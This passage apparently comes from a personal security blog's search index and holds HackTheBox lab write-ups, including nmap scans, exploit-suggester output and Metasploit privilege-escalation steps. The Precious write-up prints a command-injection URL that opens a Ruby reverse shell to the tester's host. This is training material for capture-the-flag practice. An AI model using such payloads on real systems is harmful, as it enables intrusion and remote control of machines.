KB2928120 [06]: KB2931358 [07]: KB2931366 [08]: KB2933826 [09]: KB2938772 [10]: KB2949621 [11]: KB2954879 [12]: KB2958262 [13]: KB2958263 [14]: KB2961072 [15]: KB2965500 [16]: KB2966407 [17]: KB2967917 [18]: KB2971203 [19]: KB2971850 [20]: KB2973351 [21]: KB2973448 [22]: KB2975061 [23]: KB2976627 [24]: KB2977629 [25]: KB2981580 [26]: KB2987107 [27]: KB2989647 [28]: KB2998527 [29]: KB3000850 [30]: KB3003057 [31]: KB3014442 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.8 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. Sherlock.ps1 This tool is Deprecated. Have a look at Watson instead. So we can either try Watson or Sherlock I tried precompiled Watson, it didn\u0026rsquo;t work. Need to compile it myself next time So I used Sherlock PS C:\\Users\\kostas\\Downloads\u0026gt; import-module .\\sherlock.ps1 PS C:\\Users\\kostas\\Downloads\u0026gt; Find-AllVulns Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : \u0026#39;mrxdav.sys\u0026#39; WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Appears Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Appears Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h tml VulnStatus : Not Vulnerable I also ran wesng There were a lot of CVEs So I thought maybe I should try metasploit's local exploit suggester Created msfvenom payload for meterpreter Started msfconsole and ran multi/handler Uploaded and ran msfvenom payload from the shell we got before And booted exploit suggester We see MS16-032 Which was in Sherlock's output So I tried running it before, but had luck Upon further investigation, exploit-db exploit won\u0026rsquo;t work since it spawns the new window So I tried running metasploit's version of MS16-032 exploit Check ippsec\u0026rsquo;s video or 0xdf\u0026rsquo;s writetup regaring the MS16-032, they used Empire's version of MS16-032 script ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/optimum/images/optimum.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/optimum/","summary":"Optimum Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.","tags":["HTB"],"title":"[HTB] Machine: Optimum"},{"categories":null,"contents":"Arctic Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 148.92 seconds Only 3 ports are open Let\u0026rsquo;s check port 8500 I opened using browser After scavenging through directories, we can see interesting path We see the version and the application running After googling a bit, we can see there is a vulnerability Foothold/User So let\u0026rsquo;s try exploiting application I used CVE-2009-2265, since provides a nice description of the exploit And we get a foothold and user Root Let\u0026rsquo;s try escalating our privileges There are different ways to approach this We can use wesng Beware of the huge output from the tool Or since it\u0026rsquo;s an old box, I thought it was intended to be solved using metasploit Maybe I am wrong Download meterpreter payload generated by msfvenom And get a meterpreter shell Then we run exploit suggester We get a bunch of results Then we try running each one with a hope that we get privileged access Or you can try other kernel exploits available in this box But since it was an old box, I tried running MS10-092 I had no success (even tried doing it manually), maybe it was metasploit version problem or something else (the box was laggy and I had connection issues) You can check ippsec\u0026rsquo;s writeup, who solved it using the same vulnerability with success ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/arctic/images/arctic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/arctic/","summary":"Arctic Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Arctic"},{"categories":null,"contents":"Devel Enumeration Nmap â”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 | http-methods: |_ Potentially risky methods: TRACE Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds nmap reveals that Anonymous FTP login allowed and we see the content Let\u0026rsquo;s check ftp manually We see that the content is hosted by the http server Let\u0026rsquo;s see if we can upload the files to ftp And we get a webshell Foothold \u0026amp; Root So I decided to use metasploit in this case, since it has built-in exploit suggester So I have to upload meterpreter shell payload generated by msfvenom After getting access, I ran exploit suggester We can\u0026rsquo;t use first option, since it seems like it\u0026rsquo;s used when you want to elevate and bypass UAC So We use the next option Set the options, run the exploit and get NT Autority\\System I suggest checking 0xdf\u0026rsquo;s writeup He provides another approach for privesc ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/devel/images/devel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/devel/","summary":"Devel Enumeration Nmap â”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.","tags":["HTB"],"title":"[HTB] Machine: Devel"},{"categories":null,"contents":"Legacy Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.71 seconds Nmap vulnerability scripts â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p139,445,135 --script *vuln* 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:17 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.11s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds Right away it states that it\u0026rsquo;s vulnerable to MS08-067 https://www.exploit-db.com/exploits/7104 Root Let\u0026rsquo;s run metasploit and execute an exploit I was lazy to search for a Github exploit And we have an access as LEGACY$ machine account ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/legacy/images/legacy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/legacy/","summary":"Legacy Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed.","tags":["HTB"],"title":"[HTB] Machine: Legacy"},{"categories":null,"contents":"Lame Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA) |_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2023-05-30T12:14:42-04:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h59m54s, deviation: 2h49m43s, median: -6s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.17 seconds Checked SMB After googling, found a vulnerable FTP version Checked SMB version Googling revealed Username map script Since I am trying not to use Metasploit, I searched for exploit and found one on github Root Let\u0026rsquo;s run exploit and get foothold Got reverse shell Let\u0026rsquo;s check user Oh, we are root ","date":"May 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lame/images/lame.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lame/","summary":"Lame Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.","tags":["HTB"],"title":"[HTB] Machine: Lame"},{"categories":null,"contents":"Precious Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds Let\u0026rsquo;s check port 80 It\u0026rsquo;s a service that converts Web Pages to PDF Let\u0026rsquo;s supply anything and see what it returns I am running Burp Suite in the background So after supplying any url, we receive a pdf So I tried figuring out the backend service, or library that was responsible for conversion I took the response data from Burp Suite and used Cyber Chef to decode it We see the package and it\u0026rsquo;s version After a little bit of googling Let\u0026rsquo;s test it I set up tcpdump to listen to ICMP Success Let\u0026rsquo;s get a foothold Foothold I used revshells.com to create a payload for Ruby (It was revealed in Burp Suite responses and pdfkit is a Ruby package) http://10.10.16.37:8000/index.html?p=#{\u0026#39;%20`ruby -rsocket -e\u0026#39;spawn(\u0026#34;sh\u0026#34;,[:in,:out,:err]=\u0026gt;TCPSocket.new(\u0026#34;10.10.16.37\u0026#34;,6666))\u0026#39;`\u0026#39;} Try the payload And We get a reverse shell Now we need to privesc After running the linpeas.sh We see that we have another user â•”â•â•â•â•â•â•â•â•â•â•â•£ Users with console henryâŒ1000:1000:henry,,,:/home/henry:/bin/bash rootâŒ0:0:root:/root:/bin/bash rubyâŒ1001:1001::/home/ruby:/bin/bash User After checking the home directory of the ruby user I found henry credentials And su to henry Let\u0026rsquo;s get root Root The first thing I check is sudo privileges And we get a result Let\u0026rsquo;s check the file According to the comments, the script loads the list of dependencies from the dependencies.yaml and compares them to the ones already installed After googling We find that there is a yaml injection or https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml Check the version So let\u0026rsquo;s try Firstly, it seems like the script searches for dependencies.yaml file in the directory where we execute the command So we can create dependencies.yaml anywhere where we have the privileges to do so Copy the payload from the links above Run the command And we get our flag ","date":"May 20, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/precious/images/precious.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/precious/","summary":"Precious Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.","tags":["HTB"],"title":"[HTB] Machine: Precious"},{"categories":null,"contents":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/hackthebox/overview/images/htb.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/overview/","summary":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","tags":["HTB"],"title":"[HTB] Overview"},{"categories":null,"contents":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/active_directory/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/active_directory/","summary":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Active Directory"],"title":"[Pentesting] Active Directory"},{"categories":null,"contents":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/attacking_services/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/attacking_services/","summary":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Attacking Services"],"title":"[Pentesting] Attacking Services"},{"categories":null,"contents":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/file_transfers/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/file_transfers/","summary":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["File Transfers"],"title":"[Pentesting] File Transfers"},{"categories":null,"contents":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/footprinting_and_enumeration/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/footprinting_and_enumeration/","summary":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Footprinting and Enumeration"],"title":"[Pentesting] Footprinting and Enumeration"},{"categories":null,"contents":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/linux_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/linux_privilege_escalation/","summary":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Linux Privilege Escalation"],"title":"[Pentesting] Linux Privilege Escalation"},{"categories":null,"contents":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/mobile_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/mobile_pentesting/","summary":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Mobile Pentesting"],"title":"[Pentesting] Mobile Pentesting"},{"categories":null,"contents":"This section will contain Network Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/network_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/network_pentesting/","summary":"This section will contain Network Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Network Pentesting"],"title":"[Pentesting] Network Pentesting"},{"categories":null,"contents":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/osint/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/osint/","summary":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["OSINT"],"title":"[Pentesting] OSINT"},{"categories":null,"contents":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/","summary":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Pivoting, Tunneling and Port Forwarding"],"title":"[Pentesting] Pivoting, Tunneling and Port Forwarding"},{"categories":null,"contents":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/shells_and_payloads/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/shells_and_payloads/","summary":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Shells and Payloads"],"title":"[Pentesting] Shells and Payloads"},{"categories":null,"contents":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/web_attacks/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/web_attacks/","summary":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Web Attacks"],"title":"[Pentesting] Web Attacks"},{"categories":null,"contents":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/windows_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/windows_privilege_escalation/","summary":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Windows Privilege Escalation"],"title":"[Pentesting] Windows Privilege Escalation"},{"categories":null,"contents":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/pwn.college/overview/images/pwn.college.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pwn.college/overview/","summary":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","tags":["pwn.college"],"title":"[pwn.college] Overview"},{"categories":null,"contents":"This section will contain Guided Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/guided-hacking/overview/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/overview/","summary":"This section will contain Guided Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] Overview"},{"categories":null,"contents":"Ansible Installation Ansible Installation: Control Node Docs Install python3: apt install python3 python3-pip Install ansible: pip3 install ansible or python3 -m pip install --user ansible or python3 -m pip install --user ansible-core==2.12.3 Confirm: ansible --version or python3 -m pip show ansible Ansible Installation: Managed node Requires Python 2.7, or Python 3.5 - 3.11 to run Ansible library code Install python3: apt install python3 python3-pip Needs a user account that can SSH to the node with an interactive POSIX shell Setting up Ansible: Inventory file ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/ansible/","summary":"Ansible Installation Ansible Installation: Control Node Docs Install python3: apt install python3 python3-pip Install ansible: pip3 install ansible or python3 -m pip install --user ansible or python3 -m pip install --user ansible-core==2.12.3 Confirm: ansible --version or python3 -m pip show ansible Ansible Installation: Managed node Requires Python 2.7, or Python 3.5 - 3.11 to run Ansible library code Install python3: apt install python3 python3-pip Needs a user account that can SSH to the node with an interactive POSIX shell Setting up Ansible: Inventory file ","tags":null,"title":"Ansible"},{"categories":null,"contents":"Install Ansible: Step 1 Install Ansible: Step 1 Install ansible ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/box-settings/","summary":"Install Ansible: Step 1 Install Ansible: Step 1 Install ansible ","tags":null,"title":"Box-settings"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/ffuf/","summary":"Wfuzz Options ","tags":null,"title":"Ffuf"},{"categories":null,"contents":"Gobuster Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/gobuster/","summary":"Gobuster Options ","tags":null,"title":"Gobuster"},{"categories":null,"contents":"Kiterunner Options ","date":"January 1, 